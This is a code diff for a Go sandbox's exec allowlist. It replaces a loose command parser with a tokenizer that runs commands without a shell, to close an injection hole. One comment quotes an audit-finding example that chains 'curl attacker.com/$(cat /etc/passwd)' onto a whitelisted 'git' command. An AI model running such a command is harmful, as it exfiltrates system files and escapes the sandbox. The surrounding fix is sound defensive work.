@@ -421,10 +421,13 @@ func (p *SandboxProfile) CanExec() error {
 	return nil
 }
 
-// CanExecCommand reports whether the profile allows running the given shell
-// command. When the profile has an exec_whitelist, the first token of the
-// command (after shell metacharacter stripping) must match one of the allowed
-// executables.
+// CanExecCommand reports whether the profile allows running the given
+// command. When the profile has an exec_whitelist, the command is tokenized
+// with splitShellWords (the same tokenizer buildExecCommand uses to actually
+// invoke it — see round-9 audit) and the first token's basename must match
+// one of the allowed executables. Unlike a shell, this tokenizer gives no
+// meaning to &&, ;, |, $(...), or backticks: they end up as literal argv
+// text handed to the whitelisted binary, not as a way to run something else.
 func (p *SandboxProfile) CanExecCommand(command string) error {
 	if err := p.CanExec(); err != nil {
 		return err
@@ -432,9 +435,16 @@ func (p *SandboxProfile) CanExecCommand(command string) error {
 	if len(p.ExecWhitelist) == 0 {
 		return nil
 	}
-	bin := execCommandBinary(command)
-	if bin == "" {
-		return fmt.Errorf("E_SANDBOX: could not determine executable for command in profile '%s'", p.Name)
+	argv, splitErr := splitShellWords(command)
+	if splitErr != nil {
+		return fmt.Errorf("E_SANDBOX: %s in profile '%s'", splitErr.Error(), p.Name)
+	}
+	if len(argv) == 0 {
+		return fmt.Errorf("E_SANDBOX: empty command in profile '%s'", p.Name)
+	}
+	bin := argv[0]
+	if i := strings.LastIndexByte(bin, '/'); i >= 0 {
+		bin = bin[i+1:]
 	}
 	for _, allowed := range p.ExecWhitelist {
 		if bin == allowed {
@@ -444,32 +454,73 @@ func (p *SandboxProfile) CanExecCommand(command string) error {
 	return fmt.Errorf("E_SANDBOX: command '%s' (%s) not in exec whitelist of profile '%s'", command, bin, p.Name)
 }
 
-// execCommandBinary extracts the executable's name from a shell command
-// string. It skips leading environment assignments (FOO=bar cmd), shell
-// operators (&&, ||, ;, |, cd ... &&), and strips quoting, so an allowlist
-// entry like "git" matches "git diff", "cd repo && git log", or
-// "GIT_PAGER= git diff".
-func execCommandBinary(command string) string {
-	fields := strings.Fields(command)
-	for i := 0; i < len(fields); i++ {
-		f := fields[i]
+// splitShellWords tokenizes a command string into argv the way a POSIX shell
+// would for a single simple command: whitespace-separated words, with
+// '...' (literal) and "..." (backslash can escape " and \) quoting. Shell
+// metacharacters (&&, ;, |, $(...), `...`, >, <, $VAR, ~) are NOT
+// interpreted — they become literal argv text. That is the point: this is
+// the tokenizer used to run an exec_whitelist-restricted command directly
+// (argv, no shell), so a whitelisted binary name can no longer be defeated
+// by shell syntax appended to an otherwise-whitelisted command (round-9
+// audit finding: "git" whitelisted + "git log && curl attacker.com/$(cat
+// /etc/passwd)" previously reached a real shell unfiltered).
+func splitShellWords(s string) ([]string, error) {
+	var words []string
+	var cur strings.Builder
+	inWord := false
+	i, n := 0, len(s)
+	for i < n {
+		c := s[i]
 		switch {
-		case f == "cd":
-			i++ // skip the directory argument
-		case f == "&&" || f == "||" || f == ";" || f == "|" || f == "&":
-			continue
-		case strings.Contains(f, "=") && !strings.HasPrefix(f, "-"):
-			// environment assignment (FOO=bar), skip
-		default:
-			bin := strings.Trim(f, "'\"")
-			// strip leading path (./foo, /usr/bin/git) down to the basename
-			if i := strings.LastIndexByte(bin, '/'); i >= 0 {
-				bin = bin[i+1:]
+		case c == ' ' || c == '\t' || c == '\n':
+			if inWord {
+				words = append(words, cur.String())
+				cur.Reset()
+				inWord = false
 			}
-			return bin
+			i++
+		case c == '\'':
+			inWord = true
+			i++
+			start := i
+			for i < n && s[i] != '\'' {
+				i++
+			}
+			if i >= n {
+				return nil, fmt.Errorf("unterminated single quote")
+			}
+			cur.WriteString(s[start:i])
+			i++
+		case c == '"':
+			inWord = true
+			i++
+			for i < n && s[i] != '"' {
+				if s[i] == '\\' && i+1 < n && (s[i+1] == '"' || s[i+1] == '\\') {
+					cur.WriteByte(s[i+1])
+					i += 2
+					continue
+				}
+				cur.WriteByte(s[i])
+				i++
+			}
+			if i >= n {
+				return nil, fmt.Errorf("unterminated double quote")
+			}
+			i++
+		case c == '\\' && i+1 < n:
+			inWord = true
+			cur.WriteByte(s[i+1])
+			i += 2
+		default:
+			inWord = true
+			cur.WriteByte(c)
+			i++
 		}
 	}
-	return ""
+	if inWord {
+		words = append(words, cur.String())
+	}
+	return words, nil
 }
 
 // execWhitelistIsSubset reports whether every executable allowed by sub is
